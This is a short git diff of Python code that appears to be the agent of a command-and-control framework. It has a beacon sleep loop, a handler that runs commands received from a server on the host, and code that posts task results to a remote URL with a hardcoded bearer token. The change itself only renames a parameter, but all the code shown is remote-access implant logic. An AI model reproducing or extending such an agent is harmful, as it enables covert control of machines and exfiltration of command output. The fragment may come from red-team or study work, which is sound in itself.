@@ -63,7 +63,7 @@ def Main():
         time.sleep(wait_time)
 
 
-def HandleBuiltInCommand(completeURL, taskID, cmd, args, Key, ID):
+def HandleBuiltInCommand(completeURL, taskID, cmd, args, Key, id):
     print('Setting beacon to', args)
     local_wait_time = int(args)
     print(local_wait_time)
@@ -74,7 +74,7 @@ def HandleBuiltInCommand(completeURL, taskID, cmd, args, Key, ID):
                'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE2NzU4NzgyNTd9.a5qvT7qHZbeDuPDOww9qHgxrj9LoafQ3wpGqHfu0AuI'}
 
     POSTdata = {
-        "id": ID,
+        "id": id,
         "key": Key,
         "task": {
             'id': taskID,
@@ -85,7 +85,7 @@ def HandleBuiltInCommand(completeURL, taskID, cmd, args, Key, ID):
     requests.post(completeURL, headers=headers, json=POSTdata)
 
 
-def HandleOnBoxCommand(completeURL, taskID, cmd, args, Key, ID,):
+def HandleOnBoxCommand(completeURL, taskID, cmd, args, Key, id):
 
     # Run the command and store the output
     args_list = shlex.split(args)
@@ -102,7 +102,7 @@ def HandleOnBoxCommand(completeURL, taskID, cmd, args, Key, ID,):
                'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE2NzU4NzgyNTd9.a5qvT7qHZbeDuPDOww9qHgxrj9LoafQ3wpGqHfu0AuI'}
 
     POSTdata = {
-        "id": ID,
+        "id": id,
         "key": Key,
         "task": {
             'id': taskID,
